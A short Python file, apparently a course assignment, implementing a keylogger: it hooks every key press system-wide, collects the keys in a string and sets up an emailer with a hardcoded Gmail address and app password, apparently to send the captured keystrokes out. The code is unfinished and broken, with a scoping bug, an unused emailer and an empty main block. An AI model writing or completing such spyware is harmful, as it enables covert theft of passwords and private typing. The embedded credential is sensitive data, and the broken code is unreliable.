import keyboard
import time
from emailer import Emailer

local_raw = ""

def handle_key_press(event):
    if event.event_type == "down":
        local_raw += event.name
keyboard.hook(handle_key_press)

def main():
    emailer = Emailer("keylogger.assignment.JAC@gmail.com", "grvlbtrmgqknrvah")
    while True:
        time.sleep(60)


if __name__ == "__main__":
